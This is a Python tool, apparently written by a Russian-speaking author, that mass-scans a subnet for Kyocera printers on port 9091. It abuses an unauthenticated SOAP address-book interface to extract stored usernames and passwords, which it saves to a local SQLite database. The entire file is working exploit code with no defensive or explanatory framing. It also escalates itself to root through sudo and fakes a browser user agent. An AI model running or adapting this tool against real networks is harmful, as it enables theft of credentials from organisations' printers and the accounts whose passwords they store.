import argparse
import socket
import re
import os
import sys
import ipaddress
import sqlite3
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from scapy.all import ARP, Ether, srp, conf
import requests
from lxml import etree
from tabulate import tabulate
from colorama import Fore, Style
import time
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Kyocera:
    def __init__(self):
        self.interface = None
        self.subnet = None
        self.alive_ips = None
        self.valid_ips = []
        self.credentials = []
        self.address_book_url = '/ws/km-wsdl/setting/address_book'
        self.headers = {
            "user-agent":
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; "
                "..NET CLR 1.1.4322; InfoPath.1; "
                ".NET CLR 2.0.50727)",
            "accept": "en-us",
            "content-type": "application/soap+xml"
        }
        self.regex_pattern_result = r'<kmaddrbook:login_name>[^\<]*</kmaddrbook:login_name><kmaddrbook:login_password>[^\<]*</kmaddrbook:login_password>'
        self.regex_pattern_credentials = r'<kmaddrbook:login_name>([^\<]*)</kmaddrbook:login_name><kmaddrbook:login_password>([^\<]*)</kmaddrbook:login_password>'
        self.body_create = f'<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>'
        self.enumeration_request = ''

    @staticmethod
    def check_root_permissions():
        if os.geteuid() != 0:
            os.execvp('sudo', ['sudo', 'python3'] + sys.argv)

    def argument_parser(self):
        parser = argparse.ArgumentParser(
            prog='Extract Kyocera address book credentials')
        subparsers = parser.add_subparsers(dest='command', help='Доступные команды')

        # Подкоманда для сканирования
        scan_parser = subparsers.add_parser('scan', help='Сканирование подсети и извлечение данных')
        scan_parser.add_argument('-i', '--interface', help='Сетевой интерфейс', required=True)
        scan_parser.add_argument('-s', '--subnet', help='Подсеть или одиночный IP-адрес для сканирования', required=True)

        # Подкоманда для show
        subparsers.add_parser('show', help='Показать содержимое таблицы kyocera')

        # Подкоманда для clear
        subparsers.add_parser('clear', help='Очистить содержимое таблицы kyocera')

        args = parser.parse_args()

        # Обработка команд
        if args.command == 'scan':
            self.interface = args.interface
            self.subnet = args.subnet
        elif args.command == 'show':
            self.show_db_data()
            sys.exit()
        elif args.command == 'clear':
            self.clear_db()
            sys.exit()
        else:
            parser.print_help()
            sys.exit()



    def create_db(self):
        """
        Создает таблицу kyocera, если она еще не создана.
        """
        conn = sqlite3.connect('suzu.db')
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS kyocera (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                date_added TEXT NOT NULL
            )
        ''')
        conn.commit()
        conn.close()

    def insert_into_db(self, ip, username, password):
        """
        Вставляет данные в таблицу kyocera.
        """
        conn = sqlite3.connect('suzu.db')
        cursor = conn.cursor()
        date_added = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute('INSERT INTO kyocera (ip, username, password, date_added) VALUES (?, ?, ?, ?)', (ip, username, password, date_added))
        conn.commit()
        conn.close()

    def show_db_data(self):
        """
        Показать данные из таблицы kyocera.
        """
        conn = sqlite3.connect('suzu.db')
        cursor = conn.cursor()
        cursor.execute('SELECT ip, username, password, date_added FROM kyocera ORDER BY ip')
        rows = cursor.fetchall()
        conn.close()
        if rows:
            table_data = [[Fore.YELLOW + row[0] + Style.RESET_ALL, row[1], row[2], row[3]] for row in rows]
            print(tabulate(table_data, headers=[f"{Fore.MAGENTA}IP{Style.RESET_ALL}", f"{Fore.MAGENTA}Логин{Style.RESET_ALL}", f"{Fore.MAGENTA}Пароль{Style.RESET_ALL}", f"{Fore.MAGENTA}Дата добавления{Style.RESET_ALL}"], tablefmt="fancy_grid"))
        else:
            print("No data found in database.")

    def clear_db(self):
        """
        Очищает таблицу kyocera в базе данных suzu.db.
        """
        conn = sqlite3.connect('suzu.db')
        cursor = conn.cursor()
        cursor.execute('DELETE FROM kyocera')  # Удаление всех данных из таблицы
        conn.commit()
        conn.close()
        print(f"{Fore.GREEN}Таблица kyocera очищена.{Style.RESET_ALL}")

    def scan_network(self):
        try:
            ip_network = ipaddress.ip_network(self.subnet)
            ip_range = [str(ip) for ip in ip_network.hosts()]
            num_ips = len(ip_range)
            max_workers = min(1000, num_ips)
            total_ips = len(ip_range)

            for i in range(0, total_ips, max_workers):
                batch = ip_range[i:i + max_workers]
                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                    futures = {executor.submit(self.is_port_open, ip): ip for ip in batch}
                    for future in as_completed(futures):
                        ip, is_open = future.result()
                        if is_open:
                            self.valid_ips.append(ip)
        except ValueError:
            sys.exit(f'{Fore.RED}{self.subnet} не подходит под формат подсети{Style.RESET_ALL}')

    @staticmethod
    def is_port_open(ip, timeout=1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, 9091))
            return ip, result == 0

    def get_address_book(self, ip):
        try:
            response_create = requests.post(f'https://{ip}:9091{self.address_book_url}',
                                            data=self.body_create, headers=self.headers, verify=False)
            time.sleep(5)
            text = response_create.content.decode("utf-8")
            root = etree.fromstring(text)
            for appt in root.getchildren():
                for elem in appt.getchildren():
                    if 'create_personal_address_enumerationResponse' in elem.tag:
                        for item in elem.getchildren():
                            if 'enumeration' in item.tag:
                                self.enumeration_request = item.text

            body = f'<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>{self.enumeration_request}</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>'

            response_get = requests.post(f'https://{ip}:9091{self.address_book_url}',
                                         data=body, headers=self.headers, verify=False)

            address_book = response_get.content.decode("utf-8")
            result = re.findall(self.regex_pattern_result, address_book)
            for item in result:
                creds = re.search(self.regex_pattern_credentials, item)
                self.credentials.append((ip, creds.group(1), creds.group(2)))
                self.insert_into_db(ip, creds.group(1), creds.group(2))

        except requests.exceptions.ConnectionError:
            pass


if __name__ == '__main__':
    suzu_kyocera = Kyocera()

    # Проверка прав пользователя
    suzu_kyocera.check_root_permissions()

    # Чтение аргументов командной строки
    suzu_kyocera.argument_parser()

    # Создание базы данных и таблицы
    suzu_kyocera.create_db()

    # Сканирование сети на наличие открытых портов Kyocera
    suzu_kyocera.scan_network()

    # Получение аутентификационных данных для валидных IP-адресов
    for ip in suzu_kyocera.valid_ips:
        suzu_kyocera.get_address_book(ip=ip)

    # Вывод общего количества найденных паролей
    print(f"Общее количество найденных паролей: {len(suzu_kyocera.credentials)}")
